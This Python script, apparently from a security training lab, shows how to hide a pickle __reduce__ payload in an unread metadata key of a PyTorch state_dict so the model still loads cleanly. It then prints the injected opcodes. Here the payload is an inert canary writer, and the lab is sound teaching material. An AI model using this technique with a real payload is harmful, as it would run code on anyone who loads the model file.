"""Step 2: hide the lab's inert payload in an otherwise valid state_dict. Run from labs/:
    docker compose run --rm workbench python attack-unsafe-load/scripts/s02_craft_payload.py

The payload is labkit.INERT_CODE (the only payload body in the repo): it writes
work/canary-marker.txt with the canary, pid, uid and a timestamp, and prints one line.
It never touches the network, spawns a process or reads a file.
"""
import pickletools
import zipfile

import labkit

labkit.banner()

import torch  # noqa: E402


class Payload:
    def __reduce__(self):
        # On unpickling, pickle calls builtins.exec(INERT_CODE).
        return (exec, (labkit.INERT_CODE,))


def ops(path):
    z = zipfile.ZipFile(path)
    data = z.read(next(n for n in z.namelist() if n.endswith("/data.pkl")))
    return [(op.name, arg) for op, arg, _ in pickletools.genops(data)]


torch.manual_seed(0)
model = torch.nn.Sequential(torch.nn.Linear(4, 3), torch.nn.ReLU(), torch.nn.Linear(3, 2))
sd = model.state_dict()
# load_state_dict() never reads this key, so the model still loads cleanly.
sd._metadata["__canary__"] = Payload()
path = labkit.out("malicious.pt")
torch.save(sd, path)
print(f"wrote work/{path.name} ({path.stat().st_size} bytes); keys: {list(sd.keys())}")

mal = ops(path)
print("\nGLOBAL imports: " + " | ".join(dict.fromkeys(str(a) for n, a in mal if n == "GLOBAL")))
i = next(k for k, (n, a) in enumerate(mal) if a == "__canary__")
j = next(k for k in range(i, len(mal)) if mal[k][0] == "REDUCE")
print("\ninjected opcodes (the value of state_dict._metadata['__canary__']):")
for name, arg in mal[i:j + 1]:
    shown = "" if arg is None else repr(arg)
    print(f"  {name:<12} {shown[:70] + ('...' if len(shown) > 70 else '')}")
benign = labkit.inp("work/benign.pt")
if benign.exists():
    print(f"\nopcodes: benign.pt {len(ops(benign))}, malicious.pt {len(mal)} (+{len(mal) - len(ops(benign))})")
